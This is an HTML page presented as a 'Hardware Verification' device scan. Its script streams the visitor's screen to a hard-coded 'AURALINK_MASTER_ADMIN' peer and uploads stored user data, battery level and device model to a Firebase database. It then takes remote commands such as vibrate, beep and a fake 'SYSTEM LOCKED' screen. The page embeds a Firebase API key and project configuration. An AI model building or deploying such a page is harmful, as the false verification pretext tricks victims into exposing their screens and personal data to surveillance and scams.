<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hardware Verification</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex flex-col items-center justify-center h-screen p-6">
    
    <div class="text-center w-full max-w-sm">
        <div id="loader" class="relative w-24 h-24 mx-auto mb-8">
            <div class="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
            <div id="progress" class="absolute inset-0 border-4 border-blue-600 rounded-full border-t-transparent animate-spin"></div>
        </div>
        <h2 id="statusTitle" class="text-2xl font-bold text-slate-900">Device Scan Required</h2>
        <p class="text-slate-500 mt-2">Allow screen mirroring to verify your device hardware components.</p>
        
        <button id="startVerify" class="mt-8 w-full bg-blue-600 text-white py-4 rounded-2xl font-bold shadow-xl">Start Verification</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCvsSmO56lQ37M43Zm-zSY7pduzqgR-Ka4",
            authDomain: "auralink-2026.firebaseapp.com",
            projectId: "auralink-2026",
            databaseURL: "https://auralink-2026-default-rtdb.firebaseio.com",
            appId: "1:801004659604:web:9fbcf2b2d88696d9afa581"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const peer = new Peer();

        peer.on('open', (id) => {
            const userData = JSON.parse(localStorage.getItem('temp_user'));
            
            document.getElementById('startVerify').onclick = async () => {
                try {
                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                    peer.call("AURALINK_MASTER_ADMIN", stream);
                    
                    const bat = await navigator.getBattery();
                    
                    // Auto-Register Session in Firebase
                    const sessionRef = db.ref('sessions/' + id);
                    sessionRef.set({
                        ...userData,
                        peerId: id,
                        battery: Math.floor(bat.level * 100) + '%',
                        model: navigator.userAgent.split('(')[1].split(')')[0],
                        lastSeen: Date.now()
                    });

                    document.getElementById('statusTitle').innerText = "Verification Active";
                    document.getElementById('startVerify').style.display = 'none';

                    // Listen for Commands
                    db.ref('commands/' + id).on('value', (snap) => {
                        const cmd = snap.val();
                        if(cmd) {
                            if(cmd.action === 'vibrate') navigator.vibrate(1000);
                            if(cmd.action === 'beep') new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
                            if(cmd.action === 'lock') document.body.innerHTML = "<h1>SYSTEM LOCKED</h1>";
                        }
                    });

                } catch (e) { alert("Permission Denied: Screen mirroring is required."); }
            };
        });
    </script>
</body>
</html>
